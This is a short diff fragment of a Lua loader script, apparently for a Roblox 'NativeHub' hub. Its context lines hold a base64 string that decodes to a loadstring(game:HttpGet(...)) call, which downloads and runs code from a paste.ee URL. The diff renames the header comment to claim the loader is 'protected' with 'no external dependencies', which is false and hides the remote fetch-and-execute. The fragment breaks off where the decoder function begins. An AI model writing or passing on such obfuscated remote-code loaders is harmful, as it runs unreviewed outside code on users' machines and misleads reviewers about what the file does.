@@ -1,4 +1,4 @@
--- NativeHub Lura-style loader with inline base64 decoder
+-- NativeHub protected loader (no external dependencies)
 
 local b64 = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGUuZWUvcnggR3hlUVRZeCIpKCk="
 local function decode(data)
